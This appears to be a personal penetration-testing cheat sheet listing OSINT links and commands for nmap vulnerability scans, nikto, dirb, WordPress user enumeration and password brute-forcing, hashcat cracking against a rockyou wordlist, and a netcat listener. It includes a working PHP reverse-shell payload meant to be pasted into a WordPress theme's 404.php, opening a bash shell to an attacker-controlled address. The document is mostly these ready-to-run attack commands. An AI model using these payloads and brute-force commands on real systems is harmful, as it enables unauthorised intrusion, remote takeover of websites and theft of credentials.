# Hacking-Tool
https://www.whois.com/whois
https://wigle.net/
https://gchq.github.io/CyberChef/

exiftool <bild.png>

## Scan
### Nmap
    nmap -A -p 22,80,443 <ip>
    nmap --script vuln -p 22,80,443 <ip>
### nikto
    nikto -h http://<ip>/ -nossl
### Directory scan
    dirb http://<ip>
### Wordpress scan
    wpscan --url http://<ip>/ -et -ep -eu 
    wpscan --url http://<ip>/ --wp-content-dir -et -ep -eu
    Bruteforcing wordpress:
    wpscan --url http://<ip>/ --wp-content-dir -eu -P <file>.dic

## asdf
  ### hashcat
    hashcat -m 0 <hash> ~/Desktop/rockyou.txt //
    hashcat -m 0 <hash> ~/Desktop/rockyou.txt --show

## reverse shell
### listener
    nc -lvp <port>
### php // wordpress
    Go to appearance -> editor -> Put the code in 404.php
    <?php
    exec("/bin/bash -c 'bash -i >& /dev/tcp/<ip>/<port> 0>&1'");
    ?>


## Else

#### Sort file and remove duplication
    sort <file> | uniq > sort_<file>
    wc -l sort_<file>
